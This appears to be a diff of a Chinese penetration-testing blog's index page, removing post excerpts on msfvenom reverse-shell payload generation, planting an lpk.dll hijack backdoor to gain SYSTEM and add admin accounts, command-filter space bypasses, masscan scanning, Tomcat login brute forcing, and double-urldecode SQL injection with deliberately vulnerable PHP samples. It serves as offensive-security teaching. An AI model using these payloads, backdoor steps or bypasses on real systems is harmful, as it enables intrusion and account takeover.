-<p>Options:<br>    -p, --payload    <payload>    指定需要使用的payload。如果需要自定义，请使用“-”或者stdin指定<br>      --payload-options        列出payload的选项<br>    -l, --list    [module_type]    列出指定模块的所有可用资源，模块类型包括payloads、encoders、nops和all<br>    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度<br>    -f, --format    <format>        指定输出格式（使用--help-formats来获取msf支持的格式）<br>    -e, --encoder    <encoder>    指定需要使用的encoder（编码器）<br>    -a, --arch        <architecture>    指定payload的目标架构<br>       --plateform    <plateform>    指定payload的目标平台<br>    -s, --space    <length>        设置有效攻击载荷的最大长度<br>    -b, --bad-chars    <list>    设置规避字符集<br>    -i, --iterations    <count>        指定payload的编码次数<br>    -c, --add-code    <path>        指定一个附加的win32 shellcode文件<br>    -x, --template <path>        指定一个自定义的可执行文件作为模板<br>    -k, --keep                    保护模板程序的动作，注入的payload作为一个新进程运行<br>       --payload-options        列举payload的标准选项<br>    -o, --out    <path>            保存payload<br>    -v, --var-name     <name>        指定一个自定义变量，以确定输出格式<br>    --shellest                    最小化生成payload<br>    -h, --help                查看帮助选项<br>    --help-formats                查看msf支持的输出格式列表</name></path></path></path></count></list></length></plateform></architecture></encoder></format></length></payload></p>
-<h3 id="列出所有的模块资源"><a href="#列出所有的模块资源" class="headerlink" title="列出所有的模块资源"></a>列出所有的模块资源</h3><p>使用msfvenom –l来列出所有的模块资源， 可以指定模块payloads、encoders、nops和all。msfvenom支持的Payload极多，需要好好挖掘。如下：<br><img src="http://static.zybuluo.com/xmy2017/fgjgf3za6dg2velm4e316ny2/9.png" alt="9.png-198.5kB"></p>
-<h3 id="常用的系统Payload"><a href="#常用的系统Payload" class="headerlink" title="常用的系统Payload"></a>常用的系统Payload</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre>msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX –f elf –o shell.elf</pre>
-<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">lpk后门的使用</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 16:03:55 / 修改时间：16:06:56" itemprop="dateCreated datePublished" datetime="2020-01-14T16:03:55+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%90%8E%E9%97%A8%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
-                    <span itemprop="name">后门工具</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="什么是lpk"><a href="#什么是lpk" class="headerlink" title="什么是lpk"></a>什么是lpk</h3><p>lpk.dll是一个系统文件，它位于system32目录下，每个可执行文件运行之前都会加它。Windows系统的特性是先判断当前文件目录是否存在lpk.dll文件，如果不存在，再判断sytem32目录。基于这个特性，lpk的劫持就产生了。</p>
-<h3 id="T00ls-Lpk-Sethc"><a href="#T00ls-Lpk-Sethc" class="headerlink" title="T00ls Lpk Sethc"></a>T00ls Lpk Sethc</h3><p>这款工具是用于劫持lpk的后门，可以当作辅助提权之用。下面介绍它的用法。<br>使用流程大体如下：<br>（1）生成lpk.dll文件；<br>（2）上传lpk.dll文件到目标服务器有可执行文件的目录，等待管理员运行可执行文件；<br>（3）使用lpk后门控制目标服务器。</p>
-<h4 id="生成lpk-dll文件"><a href="#生成lpk-dll文件" class="headerlink" title="生成lpk.dll文件"></a>生成lpk.dll文件</h4><p>生成lpk.dll文件前请关闭杀毒软件，否则会生成失败。生成过程如下：<br><img src="http://static.zybuluo.com/xmy2017/o5cu6lrozxgby2u2ynns6prs/6.png" alt="6.png-29.3kB"><br>如果目标主机没有开放3389，可以钩选“执行CMD”，使用命令开启3389端口。也可以通过配置邮件通知来获知管理员是否执行后门。这里的“Sethc启动设置”是指启用后门的组合键，如果不知道键值查看热键代码表，此处为A键和B键。<br>点击“生成”即可生成lpk.dll文件，这里需要注意的是命名一定要是“lpk.dll”，不能更改。生成成功后不要再运行T00ls Lpk Sethc程序，否则自己就中木马了。</p>
-<h4 id="上传lpk-dll到目标服务器"><a href="#上传lpk-dll到目标服务器" class="headerlink" title="上传lpk.dll到目标服务器"></a>上传lpk.dll到目标服务器</h4><p>将lpk.dll上传到目标服务器，需要目录里面有可执行文件。这里我使用大马进行上传：<br><img src="http://static.zybuluo.com/xmy2017/vzi7q83y4w6ahp1pw7o7gs4h/7.png" alt="7.png-8.5kB"><br>上传成功后，需要等待管理员执行目录中的可执行文件，才能运行后门。这里我既然已经上传了大马了，所以我可以上传一个cmd.exe到该目录，然后运行它：<br><img src="http://static.zybuluo.com/xmy2017/ryyldqf5g9491caeaphmryzy/8.png" alt="8.png-5.9kB"><br>这样就顺利地把后门执行起来了。</p>
-<h4 id="使用lpk后门"><a href="#使用lpk后门" class="headerlink" title="使用lpk后门"></a>使用lpk后门</h4><p>远程连接目标服务器，出现如图界面后连接按下5次shift键：<br><img src="http://static.zybuluo.com/xmy2017/aiu2fncsni1bpgyjiktnev4u/9.png" alt="9.png-26.8kB"><br>出现如下界面：<br><img src="http://static.zybuluo.com/xmy2017/jn0h0ael1coqee57ihqe7pob/10.png" alt="10.png-33kB"><br>这时候同时按下设置的组合键（我这里是A键和B键），如果不成功就多按几次，成功会出现密码输入框：<br><img src="http://static.zybuluo.com/xmy2017/y53n83eknykfbh5lngnfgd1v/11.png" alt="11.png-27.6kB"><br>输入设置的密码，接下来就是愉快的玩了：<br><img src="http://static.zybuluo.com/xmy2017/oh72xke36i5c6ujcjfwomqsi/12.png" alt="12.png-22.3kB"><br>可以按“CmdShell”调出cmd窗口，可以看到，已经提权成system了：<br><img src="http://static.zybuluo.com/xmy2017/av2ptm2xwoui4243gsrui8w3/13.png" alt="13.png-34.7kB"><br>可以添加用户并加入管理员组：<br><img src="http://static.zybuluo.com/xmy2017/sbexbf6wb0cebskgduxugw0g/14.png" alt="14.png-19.8kB"><br>可以按“Explorer”调出Windows界面：<br><img src="http://static.zybuluo.com/xmy2017/lig3kiydw2peaa3yeekurpr9/15.png" alt="15.png-32.9kB"><br>功能很多，想怎么玩就怎么玩……</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/lpk%E5%90%8E%E9%97%A8%E7%9A%84%E4%BD%BF%E7%94%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">Linux命令执行小技巧</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 15:55:17 / 修改时间：16:01:20" itemprop="dateCreated datePublished" datetime="2020-01-14T15:55:17+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url" rel="index">
-                    <span itemprop="name">命令执行</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p>分别在Linux和PHP环境下测试，PHP测试脚本如下：</p>
-<pre><code class="php">&lt;?php
-    $cmd = $_GET[&#39;cmd&#39;];
-    $black = array(&#39; &#39;);
-    str_ireplace($black, &#39;&#39;, $cmd, $i);
-    if($i != 0)
-    {
-        die(&quot;Attack!&quot;);
-    }
-    else
-    {
-        system($cmd);
-    }
-?&gt;</code></pre>
-<h4 id="小于号（-lt-）"><a href="#小于号（-lt-）" class="headerlink" title="小于号（&lt;）"></a>小于号（&lt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/6u6l6n126dc253w47wtjgcs8/1.png" alt="1.png-15.7kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/59lgqax0jepw9k86wdv9gpfb/2.png" alt="2.png-59.7kB"> </p>
-<h4 id="两个尖括号（-lt-gt-）"><a href="#两个尖括号（-lt-gt-）" class="headerlink" title="两个尖括号（&lt;&gt;）"></a>两个尖括号（&lt;&gt;）</h4><p>Linux环境：<br><img src="http://static.zybuluo.com/xmy2017/elbqnmkcxvs9td6pbg3dxbem/3.png" alt="3.png-12.5kB"><br>PHP环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/ar1kv8jb8yumkfjig0x3iuyu/4.png" alt="4.png-62.6kB"> </p>
-<h4 id="Tab键（-09）"><a href="#Tab键（-09）" class="headerlink" title="Tab键（%09）"></a>Tab键（%09）</h4><p>Linux环境下无法使用：<br><img src="http://static.zybuluo.com/xmy2017/mr6mzy7ali916mydssalrp8f/5.png" alt="5.png-17.6kB"><br>PHP环境：<br><img src="http://static.zybuluo.com/xmy2017/m3qkysgcovn7kafap2206n7l/6.png" alt="6.png-59.5kB"> </p>
-<h4 id="IFS"><a href="#IFS" class="headerlink" title="$IFS$"></a>$IFS$</h4>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/Linux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%8A%80%E5%B7%A7/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/masscan%E6%89%AB%E6%8F%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/masscan%E6%89%AB%E6%8F%8F/" class="post-title-link" itemprop="url">masscan扫描</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 11:43:38 / 修改时间：15:50:46" itemprop="dateCreated datePublished" datetime="2020-01-14T11:43:38+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
-                    <span itemprop="name">扫描工具</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。</p>
-<h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><p>在Kali系统中安装方法如下：</p>
-<pre><code>apt-get install git gcc make libcap-dev
-git clone https://github.com/robertdavidgraham/masscan
-cd masscan
-make</code></pre><p>测试是否安装成功：</p>
-<pre><code>make regress</code></pre><p><img src="http://static.zybuluo.com/xmy2017/v53okv1j02bt64a8e1midgi0/1.png" alt="1.png-61.8kB"></p>
-<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="扫描指定网段指定端口"><a href="#扫描指定网段指定端口" class="headerlink" title="扫描指定网段指定端口"></a>扫描指定网段指定端口</h4><pre><code>masscan -p445,3389 192.168.31.0/24</code></pre>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/masscan%E6%89%AB%E6%8F%8F/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">Tomcat认证爆破</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 11:40:10 / 修改时间：11:41:49" itemprop="dateCreated datePublished" datetime="2020-01-14T11:40:10+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index">
-                    <span itemprop="name">密码破解</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Tomcat使用的是基础认证，基础认证的数据包格式如下：<br><img src="http://static.zybuluo.com/xmy2017/0ct4qmyouj4v0jevqn6x761y/1.png" alt="1.png-25.5kB"><br>将base64字符串解码如下：<br><img src="http://static.zybuluo.com/xmy2017/y143saychc1e2k80dmp4h4a1/2.png" alt="2.png-15.5kB"><br>很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。</p>
-<h4 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h4><p>抓包发送到Intruder，爆破只选择base64编码的字符串：<br><img src="http://static.zybuluo.com/xmy2017/mpdp633nt25lwrbxt6dtauri/3.png" alt="3.png-57.5kB"><br>Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：<br><img src="http://static.zybuluo.com/xmy2017/cgj153d9m6ci19yrq2bg5spx/4.png" alt="4.png-19.4kB"><br>Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：<br><img src="http://static.zybuluo.com/xmy2017/uqqokm9vxamo779tblokutev/5.png" alt="5.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/ru0kin2lwza36fbwuc795lpw/6.png" alt="6.png-25.8kB"><br><img src="http://static.zybuluo.com/xmy2017/83plie3m1cm002surbpgl16x/7.png" alt="7.png-31.5kB"><br>认证中还使用了base64编码技术，在Payload Processing中设置：<br><img src="http://static.zybuluo.com/xmy2017/pingr0jw8114jxuit75p7trg/8.png" alt="8.png-36.6kB"><br>最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：<br><img src="http://static.zybuluo.com/xmy2017/eir4a1w8lltvgjpajzp300px/9.png" alt="9.png-11.7kB"><br>最后Attack：<br><img src="http://static.zybuluo.com/xmy2017/d7e6rsucu7imwi1cnlv3ci5v/10.png" alt="10.png-81.2kB"></p>
-<h4 id="MSF爆破"><a href="#MSF爆破" class="headerlink" title="MSF爆破"></a>MSF爆破</h4><p>MSF中有专门爆破Tomcat的模块，如下所示：<br><img src="http://static.zybuluo.com/xmy2017/y60wk153m4st3hqn3hezryuj/11.png" alt="11.png-35.4kB"><br>进入该模块，查看配置参数：<br><img src="http://static.zybuluo.com/xmy2017/ow29c5ik2860aqplujnnukh5/12.png" alt="12.png-142.8kB"><br>配置参数：<br><img src="http://static.zybuluo.com/xmy2017/xjajbmwjvrok4z8i35euo4tt/13.png" alt="13.png-24.3kB"><br>启动爆破：<br><img src="http://static.zybuluo.com/xmy2017/fn76a1ej2kj313net50cpc0m/14.png" alt="14.png-17.9kB"></p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="小蚂蚁的小窝">
-      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xmy's house">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">urldecode-二次解码引发注入</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-01-14 11:37:09 / 修改时间：11:39:02" itemprop="dateCreated datePublished" datetime="2020-01-14T11:37:09+08:00">2020-01-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
-                    <span itemprop="name">SQL注入</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</p>
-<p>但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。</p>
-<p>例子如下：</p>
-<pre><code class="php">&lt;?php  
-    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  
-
-    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
-    mysql_select_db(&quot;test&quot;, $conn);  
-    //mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn);  
-
-    $id = mysql_real_escape_string($_GET[&#39;id&#39;]);  
-    $id = urldecode($id);  
-    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
-    $query = mysql_query($sql, $conn);  
-    if($query == True)  
-    {  
-        $result = mysql_fetch_array($query);  
-        $user = $result[&quot;user&quot;];  
-        $email = $result[&quot;email&quot;];  
-
-        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
-        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
-        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  
-    }  
-    mysql_close($conn);  
-?&gt;  </code></pre>
-<p>因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。<br>普通的注入会被转义掉：<br><img src="http://static.zybuluo.com/xmy2017/gif2jlev0vf0473tgod7oj0y/image_1bfts63ru1olf1fhf5nsgo8ihh9.png" alt="image_1bfts63ru1olf1fhf5nsgo8ihh9.png-27.8kB"></p>
-<p>于是构造URL编码引发注入：<br><img src="http://static.zybuluo.com/xmy2017/h9vajn45f3lmxi0fu4pyelnf/image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png" alt="image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png-27.4kB"></p>
-<p>可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：<br><font color="red">sqlmap -u”<a href="http://localhost/test/1.php?id=1%2527&quot;" target="_blank" rel="noopener">http://localhost/test/1.php?id=1%2527&quot;</a> –random-agent -v 3</font><br><img src="http://static.zybuluo.com/xmy2017/aj4qc6h1c031h9pg6s0c7ii8/image_1bfts72q515281pqk1jah17jhubo13.png" alt="image_1bfts72q515281pqk1jah17jhubo13.png-19.2kB"></p>
-<p>感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。</p>
-
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1181,20 +1153,20 @@ make</code></pre><p>测试是否安装成功：</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
